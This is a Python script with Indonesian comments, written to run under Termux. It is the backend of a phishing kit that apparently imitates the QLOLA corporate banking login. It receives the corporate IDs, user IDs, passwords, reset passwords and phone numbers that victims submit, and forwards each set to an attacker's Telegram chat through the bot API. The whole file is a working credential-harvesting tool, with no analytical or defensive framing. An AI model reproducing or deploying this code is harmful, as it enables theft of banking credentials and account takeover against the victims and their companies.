import http.server
import socketserver
import json
import urllib.request
import urllib.error
import os

# Membaca token dari config.json
with open('config.json', 'r') as f:
    config = json.load(f)

TELEGRAM_TOKEN = config['TELEGRAM_TOKEN']
TELEGRAM_CHAT_ID = config['TELEGRAM_CHAT_ID']

def send_to_telegram(pesan):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": pesan,
        "parse_mode": "HTML"
    }).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        if self.path == '/api/send':
            pesan = f"🔐 <b>QLOLA LOGIN</b>\n\n🏢 <b>Corporate:</b> {data.get('corpId')}\n👤 <b>User:</b> {data.get('userId')}\n🔑 <b>Sandi:</b> {data.get('password')}"
            try:
                send_to_telegram(pesan)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')
            except Exception as e:
                print("Error Telegram Login:", e)
                self.send_response(500)
                self.end_headers()

        elif self.path == '/api/reset':
            pesan = f"🔄 <b>QLOLA RESET PASSWORD</b>\n\n🔑 <b>Sandi Baru:</b> {data.get('newPassword')}\n📱 <b>No HP:</b> +62 {data.get('phone')}"
            try:
                send_to_telegram(pesan)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')
            except Exception as e:
                print("Error Telegram Reset:", e)
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

PORT = 8080
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"\n✅ Server berjalan di http://localhost:{PORT}")
    print("Jangan tutup Termux! Buka browser sekarang.")
    httpd.serve_forever()	
